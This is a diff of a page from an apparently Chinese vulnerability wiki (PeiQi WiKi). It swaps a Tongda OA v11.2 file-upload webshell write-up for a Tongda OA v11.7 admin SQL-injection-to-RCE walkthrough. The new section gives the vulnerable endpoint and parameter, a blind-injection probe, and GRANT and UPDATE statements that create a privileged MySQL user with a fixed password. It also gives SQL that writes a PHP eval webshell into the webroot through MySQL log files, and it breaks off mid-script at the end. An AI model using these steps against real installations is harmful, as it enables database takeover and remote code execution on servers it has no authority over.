@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>通达OA v11.2后台任意文件上传漏洞 · PeiQi WiKi文库</title>
+        <title>通达OA v11.7 后台SQL注入 · PeiQi WiKi文库</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -110,10 +110,10 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="通达OA v11.x-v11.5任意用户登录.html" />
+    <link rel="next" href="通达OA v11.7 在线用户登录漏洞.html" />
     
     
-    <link rel="prev" href="通达OA部分漏洞信息整合.html" />
+    <link rel="prev" href="通达OA v11.6 任意文件删除&RCE.html" />
     
 
     
@@ -1389,12 +1389,12 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.10.1" data-path="../../服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞.html">
+        <li class="chapter " data-level="2.2.10.1" data-path="../../服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html">
             
-                <a href="../../服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞.html">
+                <a href="../../服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html">
             
                     
-                    浪潮ClusterEngineV4.0 远程命令执行漏洞
+                    浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224
             
                 </a>
             
@@ -2479,12 +2479,12 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.6.3.2" data-path="通达OA v11.2后台任意文件上传漏洞.html">
+        <li class="chapter " data-level="2.6.3.2" data-path="通达OA v11.2 后台任意文件上传漏洞.md">
             
-                <a href="通达OA v11.2后台任意文件上传漏洞.html">
+                <span>
             
                     
-                    通达OA v11.2后台任意文件上传漏洞
+                    通达OA v11.2 后台任意文件上传漏洞
             
                 </a>
             
@@ -2518,12 +2518,12 @@
             
         </li>
     
-        <li class="chapter " data-level="2.6.3.5" data-path="通达OA v11.7后台SQL注入.html">
+        <li class="chapter active" data-level="2.6.3.5" data-path="通达OA v11.7 后台SQL注入.html">
             
-                <a href="通达OA v11.7后台SQL注入.html">
+                <a href="通达OA v11.7 后台SQL注入.html">
             
                     
-                    通达OA v11.7后台SQL注入
+                    通达OA v11.7 后台SQL注入
             
                 </a>
             
@@ -2563,6 +2563,19 @@
             
                     
                     通达OA v11.8 后台文件包含命令执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.3.9" data-path="通达OA v11.9 后台SQL注入漏洞.html">
+            
+                <a href="通达OA v11.9 后台SQL注入漏洞.html">
+            
+                    
+                    通达OA v11.9 后台SQL注入漏洞
             
                 </a>
             
@@ -4068,7 +4081,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../../.." >通达OA v11.2后台任意文件上传漏洞</a>
+        <a href="../../.." >通达OA v11.7 后台SQL注入</a>
     </h1>
 </div>
 
@@ -4083,38 +4096,67 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="&#x901A;&#x8FBE;oa-v112&#x540E;&#x53F0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;">&#x901A;&#x8FBE;OA v11.2&#x540E;&#x53F0;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;</h1>
+                                <h1 id="&#x901A;&#x8FBE;oa-v117&#x540E;&#x53F0;sql&#x6CE8;&#x5165;">&#x901A;&#x8FBE;OA v11.7&#x540E;&#x53F0;SQL&#x6CE8;&#x5165;</h1>
 <h2 id="&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;">&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;</h2>
-<p>&#x901A;&#x8FBE;OA v11.2&#x540E;&#x53F0;&#x5B58;&#x5728;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#xFF0C;&#x5141;&#x8BB8;&#x901A;&#x8FC7;&#x7ED5;&#x8FC7;&#x9ED1;&#x540D;&#x5355;&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x4E0A;&#x4F20;&#x6076;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x653B;&#x51FB;</p>
-<h2 id="&#x5F71;&#x54CD;&#x7248;&#x672C;">&#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
+<p>&#x901A;&#x8FBE;OA v11.7&#x540E;&#x53F0;&#x5B58;&#x5728;SQL&#x6CE8;&#x5165;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x6B64;&#x6F0F;&#x6D1E;&#x5199;&#x5165;&#x6076;&#x610F;&#x540E;&#x95E8;&#x6587;&#x4EF6;&#x653B;&#x51FB;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;</p>
+<h2 id="&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;">&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;</h2>
 <blockquote>
 <p>[!NOTE]</p>
-<p>&#x901A;&#x8FBE;OA v11.2</p>
+<p>&#x901A;&#x8FBE;OA v11.7</p>
 </blockquote>
 <h2 id="&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x73AF;&#x5883;&#x642D;&#x5EFA;</h2>
-<p><a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe" target="_blank">&#x901A;&#x8FBE;OA v11.2&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;</a></p>
-<p>&#x4E0B;&#x8F7D;&#x540E;&#x6309;&#x6B65;&#x9AA4;&#x5B89;&#x88C5;&#x5373;&#x53EF;</p>
+<p><a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe" target="_blank">&#x73AF;&#x5883;&#x5730;&#x5740;</a></p>
 <h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
-<p>&#x8BE5;&#x6F0F;&#x6D1E;&#x5B58;&#x5728;&#x4E8E;&#x540E;&#x53F0;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x767B;&#x5F55;&#x540E;&#x624D;&#x80FD;&#x8FDB;&#x884C;&#x4F7F;&#x7528;</p>
-<p>&#x767B;&#x5F55;&#x540E;&#x70B9;&#x51FB; <strong>&#x83DC;&#x5355; -&gt; &#x7CFB;&#x7EDF;&#x7BA1;&#x7406; -&gt; &#x9644;&#x4EF6;&#x7BA1;&#x7406;</strong></p>
-<p><a href="image/tongdaoa-13.png" data-lightbox="5afe07e2-38d6-44b4-a652-d8c7de1ac2d9" data-title=""><img src="image/tongdaoa-13.png" alt=""></a></p>
-<p>&#x70B9;&#x51FB;&#x6DFB;&#x52A0;&#x9644;&#x5F55;&#x5B58;&#x50A8;&#x7BA1;&#x7406;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;(&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#x4E3A; webroot &#x76EE;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; <strong>D:/MYOA/webroot/</strong>)</p>
-<p><a href="image/tongdaoa-14.png" data-lightbox="46977b94-0b5b-4fa0-8433-5294738042af" data-title=""><img src="image/tongdaoa-14.png" alt=""></a></p>
-<p>&#x70B9;&#x51FB; <strong>&#x7EC4;&#x7EC7; -&gt; &#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458; -&gt; &#x4E0A;&#x4F20;&#x9644;&#x4EF6;</strong></p>
-<p><a href="image/tongdaoa-15.png" data-lightbox="4b5e8ce7-452c-4771-bfdb-e421aafbe158" data-title=""><img src="image/tongdaoa-15.png" alt=""></a></p>
-<p>&#x6293;&#x5305;&#x4F7F;&#x7528; windows &#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5; <strong>shell.php -&gt; shell.php.</strong></p>
-<p><a href="image/tongdaoa-16.png" data-lightbox="561e2cd4-d8de-46d2-bbfb-1c4f20a4604f" data-title=""><img src="image/tongdaoa-16.png" alt=""></a></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>2012 &#x4E3A;&#x76EE;&#x5F55;</p>
-<p>1717872192 &#x4E3A;&#x62FC;&#x63A5;&#x7684;&#x6587;&#x4EF6;&#x540D;</p>
-<p>&#x6700;&#x540E;&#x7684;shell&#x540D;&#x5B57;&#x4E3A; 1717872192.shell.php</p>
-</blockquote>
-<p><a href="image/tongdaoa-17.png" data-lightbox="c66acb48-05d8-4f05-ba0a-62265e46565a" data-title=""><img src="image/tongdaoa-17.png" alt=""></a></p>
-<p>&#x8BBF;&#x95EE;&#x6728;&#x9A6C;&#x6587;&#x4EF6;</p>
-<p><a href="image/tongdaoa-18.png" data-lightbox="f45fba75-5b2a-493c-a8bd-9a8ca23c5796" data-title=""><img src="image/tongdaoa-18.png" alt=""></a> </p>
+<p>&#x5728; <strong>general/hr/manage/query/delete_cascade.php</strong> &#x6587;&#x4EF6;&#x4E2D;</p>
+<p><a href="image/tongdaoa-3.png" data-lightbox="32f43ddf-9e86-4676-9c28-16bf863864bd" data-title=""><img src="image/tongdaoa-3.png" alt=""></a></p>
+<p>&#x9996;&#x5148;&#x5224;&#x65AD;<code>$condition_cascade</code>&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x5C06;&#x5176;&#x4E2D;&#x7684;<code>\&apos;</code>&#x66FF;&#x6362;&#x4E3A;<code>&apos;</code>&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8FD9;&#x6837;&#x66FF;&#x6362;&#x5462;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;V11.7&#x7248;&#x672C;&#x4E2D;&#xFF0C;&#x6CE8;&#x518C;&#x53D8;&#x91CF;&#x65F6;&#x8003;&#x8651;&#x4E86;&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF0C;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x7528;<code>addslashes</code>&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x4FDD;&#x62A4;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><strong>inc/common.inc.php </strong>&#x4EE3;&#x7801;</p>
+<p><a href="image/tongdaoa-4.png" data-lightbox="61381e39-af8e-46bc-875d-bf7806dd19ea" data-title=""><img src="image/tongdaoa-4.png" alt=""></a></p>
+<p>&#x4F7F;&#x7528;&#x76F2;&#x6CE8;&#x5BF9;SQL&#x6CE8;&#x5165;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;</p>
+<p><a href="image/tongdaoa-5.png" data-lightbox="efe97d24-0294-48b1-afa2-389e1e32ca17" data-title=""><img src="image/tongdaoa-5.png" alt=""></a></p>
+<p>&#x89E6;&#x53D1;&#x4E86;&#x901A;&#x8FBE;OA&#x7684;SQL&#x6CE8;&#x5165;&#x62E6;&#x622A;</p>
+<p><strong>inc/conn.php</strong>&#x6587;&#x4EF6;&#x4E2D;&#x627E;&#x5230;&#x8FC7;&#x6EE4;&#x673A;&#x5236;&#x5982;&#x4E0B;:</p>
+<p><a href="image/tongdaoa-6.png" data-lightbox="d9c183bc-0e19-4f4f-b865-d4727d3e2ce4" data-title=""><img src="image/tongdaoa-6.png" alt=""></a></p>
+<p>&#x5176;&#x8FC7;&#x6EE4;&#x4E86;&#x4E00;&#x4E9B;&#x5B57;&#x7B26;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x975E;&#x65E0;&#x6CD5;&#x7ED5;&#x8FC7;&#xFF0C;&#x76F2;&#x6CE8;&#x7684;&#x6838;&#x5FC3;&#x662F;&#xFF1A;<code>substr&#x3001;if</code>&#x7B49;&#x51FD;&#x6570;&#xFF0C;&#x5747;&#x672A;&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x8981;&#x6784;&#x9020;MySQL&#x62A5;&#x9519;&#x5373;&#x53EF;&#x914D;&#x5408;<code>if</code>&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x76F2;&#x6CE8;&#x4E86;&#xFF0C;&#x7FFB;&#x770B;&#x5C40;&#x5916;&#x4EBA;&#x5E08;&#x5085;&#x5728;&#x8865;&#x5929;&#x767D;&#x5E3D;&#x5927;&#x4F1A;&#x4E0A;&#x7684;&#x5206;&#x4EAB;&#xFF0C;&#x53D1;&#x73B0;<code>power(9999,99)</code>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x6570;&#x636E;&#x5E93;&#x62A5;&#x9519;&#xFF0C;&#x6240;&#x4EE5;&#x6784;&#x9020;&#x8BED;&#x53E5;&#xFF1A;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>((<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&apos;r&apos;</span>),<span class="hljs-number">1</span>,<span class="hljs-keyword">power</span>(<span class="hljs-number">9999</span>,<span class="hljs-number">99</span>)) # &#x5F53;&#x5B57;&#x7B26;&#x76F8;&#x7B49;&#x65F6;&#xFF0C;&#x4E0D;&#x62A5;&#x9519;&#xFF0C;&#x9519;&#x8BEF;&#x65F6;&#x62A5;&#x9519;
+</code></pre>
+<p><a href="image/tongdaoa-7.png" data-lightbox="0598ad71-ce79-45f0-9ecf-d05941edadc4" data-title=""><img src="image/tongdaoa-7.png" alt=""></a></p>
+<p><a href="image/tongdaoa-8.png" data-lightbox="080061e9-eee1-4a46-a839-c8c8f1835d77" data-title=""><img src="image/tongdaoa-8.png" alt=""></a></p>
+<p>&#x6DFB;&#x52A0;SQL&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">grant</span> all <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">ON</span> mysql.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&apos;peiqi&apos;</span>@<span class="hljs-string">&apos;%&apos;</span> <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&apos;peiqiABC@123&apos;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>
+</code></pre>
+<p>&#x8BBF;&#x95EE; <strong><a href="http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant" target="_blank">http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant</a> all privileges ON mysql.* TO &apos;peiqi&apos;@&apos;%&apos; IDENTIFIED BY &apos;peiqiABC@123&apos; WITH GRANT OPTION</strong></p>
+<p>&#x8FDB;&#x5165; <strong>Myoa/mysql5/bin</strong> &#x76EE;&#x5F55; &#x6267;&#x884C; <strong>mysql -upeiqi -p</strong> &#x8F93;&#x5165;&#x5BC6;&#x7801;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x7528;&#x6237;</p>
+<p><a href="image/tongdaoa-9.png" data-lightbox="57ef37c5-fd49-4648-b62e-e4adc8db924d" data-title=""><img src="image/tongdaoa-9.png" alt=""></a></p>
+<p>&#x53D1;&#x73B0;&#x6210;&#x529F;&#x6267;&#x884C;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x8D26;&#x6237;</p>
+<p>&#x7136;&#x540E;&#x8BE5;&#x7528;&#x6237;&#x662F;&#x5BF9;mysql&#x6570;&#x636E;&#x5E93;&#x62E5;&#x6709;&#x6240;&#x6709;&#x6743;&#x9650;&#x7684;,&#x7136;&#x540E;&#x7ED9;&#x81EA;&#x5DF1;&#x52A0;&#x6743;&#x9650;&#xFF1A;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-string">`mysql`</span>.<span class="hljs-string">`user`</span> <span class="hljs-keyword">SET</span> <span class="hljs-string">`Password`</span> = <span class="hljs-string">&apos;*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D&apos;</span>, <span class="hljs-string">`Select_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Insert_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Update_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Delete_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Drop_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Reload_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Shutdown_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Process_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`File_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Grant_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`References_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Index_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Alter_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Show_db_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Super_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_tmp_table_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Lock_tables_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Execute_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Repl_slave_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Repl_client_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_view_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Show_view_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_routine_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Alter_routine_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_user_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Event_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Trigger_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`Create_tablespace_priv`</span> = <span class="hljs-string">&apos;Y&apos;</span>, <span class="hljs-string">`ssl_type`</span> = <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">`ssl_cipher`</span> = <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">`x509_issuer`</span> = <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">`x509_subject`</span> = <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">`max_questions`</span> = <span class="hljs-number">0</span>, <span class="hljs-string">`max_updates`</span> = <span class="hljs-number">0</span>, <span class="hljs-string">`max_connections`</span> = <span class="hljs-number">0</span>, <span class="hljs-string">`max_user_connections`</span> = <span class="hljs-number">0</span>, <span class="hljs-string">`plugin`</span> = <span class="hljs-string">&apos;mysql_native_password&apos;</span>, <span class="hljs-string">`authentication_string`</span> = <span class="hljs-string">&apos;&apos;</span>, <span class="hljs-string">`password_expired`</span> = <span class="hljs-string">&apos;Y&apos;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-string">`Host`</span> = <span class="hljs-keyword">Cast</span>(<span class="hljs-string">&apos;%&apos;</span> <span class="hljs-keyword">AS</span> <span class="hljs-built_in">Binary</span>(<span class="hljs-number">1</span>)) <span class="hljs-keyword">AND</span> <span class="hljs-string">`User`</span> = <span class="hljs-keyword">Cast</span>(<span class="hljs-string">&apos;peiqi&apos;</span> <span class="hljs-keyword">AS</span> <span class="hljs-built_in">Binary</span>(<span class="hljs-number">5</span>));
+</code></pre>
+<p><a href="image/tongdaoa-10.png" data-lightbox="1c19a6f4-7e3e-43bd-a3bb-bee54840c8e7" data-title=""><img src="image/tongdaoa-10.png" alt=""></a></p>
+<p>&#x7136;&#x540E;&#x7528;&#x6CE8;&#x5165;&#x70B9;&#x5237;&#x65B0;&#x6743;&#x9650;&#xFF0C;&#x56E0;&#x4E3A;&#x8BE5;&#x7528;&#x6237;&#x662F;&#x6CA1;&#x6709;&#x5237;&#x65B0;&#x6743;&#x9650;&#x7684;&#x6743;&#x9650;&#x7684;&#xFF1A;<code>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code>&#x8FD9;&#x6837;&#x5C31;&#x62E5;&#x6709;&#x4E86;&#x6240;&#x6709;&#x6743;&#x9650;</p>
+<p><a href="image/tongdaoa-11.png" data-lightbox="184277ef-1d6f-45f5-b965-d9a70b6e1e3c" data-title=""><img src="image/tongdaoa-11.png" alt=""></a></p>
+<p>&#x767B;&#x5F55;&#x5982;&#x679C;&#x5931;&#x8D25;&#xFF0C;&#x6267;&#x884C;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">grant</span> all <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">ON</span> mysql.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&apos;peiqi&apos;</span>@<span class="hljs-string">&apos;%&apos;</span> <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">&apos;peiqiABC@123&apos;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>
+</code></pre>
+<p>&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x5199;shell</p>
+<pre><code class="lang-sql"># &#x67E5;&#x8DEF;&#x5F84;&#xFF1A;
+<span class="hljs-keyword">select</span> @@basedir; # F:\OA\mysql5\&#xFF0C;&#x90A3;&#x4E48;web&#x76EE;&#x5F55;&#x5C31;&#x662F; F:/OA/webroot/
+# &#x65B9;&#x6CD5;1&#xFF1A;
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log=<span class="hljs-keyword">on</span>;
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file=<span class="hljs-string">&apos;F:/OA/webroot/&apos;</span>;
+<span class="hljs-keyword">select</span> <span class="hljs-string">&apos;&lt;?php eval($_POST[x]);?&gt;&apos;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">11</span>);
+# &#x65B9;&#x6CD5;2&#xFF1A;
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">on</span>;
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file = <span class="hljs-string">&apos;F:/OA/webroot/&apos;</span>;
+<span class="hljs-keyword">select</span> <span class="hljs-string">&apos;&lt;?php eval($_POST[x]);?&gt;&apos;</span>;
+<span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&apos;%general%&apos;</span>;
+</code></pre>
+<p>&#x4E0A;&#x4F20;&#x5927;&#x9A6C;</p>
+<p><a href="image/tongdaoa-12.png" data-lightbox="def94257-be87-4488-9e23-b79c183364c4" data-title=""><img src="image/tongdaoa-12.png" alt=""></a></p>
+<h2 id="&#x53C2;&#x8003;&#x6587;&#x7AE0;">&#x53C2;&#x8003;&#x6587;&#x7AE0;</h2>
+<p><a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw" target="_blank">&#x901A;&#x8FBE;OA v11.7&#x540E;&#x53F0;SQL&#x6CE8;&#x5165;&#x5230;RCE[0day]</a> </p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2020-12-07 09:32:33
+2020-12-07 10:49:31
 </span></footer>
                                 
                                 </section>
@@ -4142,12 +4184,12 @@
 
             
                 
-                <a href="通达OA部分漏洞信息整合.html" class="navigation navigation-prev " aria-label="Previous page: 通达OA部分漏洞信息整合">
+                <a href="通达OA v11.6 任意文件删除&RCE.html" class="navigation navigation-prev " aria-label="Previous page: 通达OA v11.6 任意文件删除&RCE">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="通达OA v11.x-v11.5任意用户登录.html" class="navigation navigation-next " aria-label="Next page: 通达OA v11.x-v11.5任意用户登录">
+                <a href="通达OA v11.7 在线用户登录漏洞.html" class="navigation navigation-next " aria-label="Next page: 通达OA v11.7 在线用户登录漏洞">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -4158,7 +4200,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"通达OA v11.2后台任意文件上传漏洞","level":"2.6.3.2","depth":3,"next":{"title":"通达OA v11.x-v11.5任意用户登录","level":"2.6.3.3","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.x-v11.5任意用户登录.md","articles":[]},"previous":{"title":"通达OA部分漏洞信息整合","level":"2.6.3.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA部分漏洞信息整合.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.2后台任意文件上传漏洞.md","mtime":"2020-12-07T01:32:33.340Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-03-31T12:47:39.473Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"通达OA v11.7 后台SQL注入","level":"2.6.3.5","depth":3,"next":{"title":"通达OA v11.7 在线用户登录漏洞","level":"2.6.3.6","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7 在线用户登录漏洞.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7 在线用户登录漏洞.md","articles":[]},"previous":{"title":"通达OA v11.6 任意文件删除&RCE","level":"2.6.3.4","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.md","ref":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 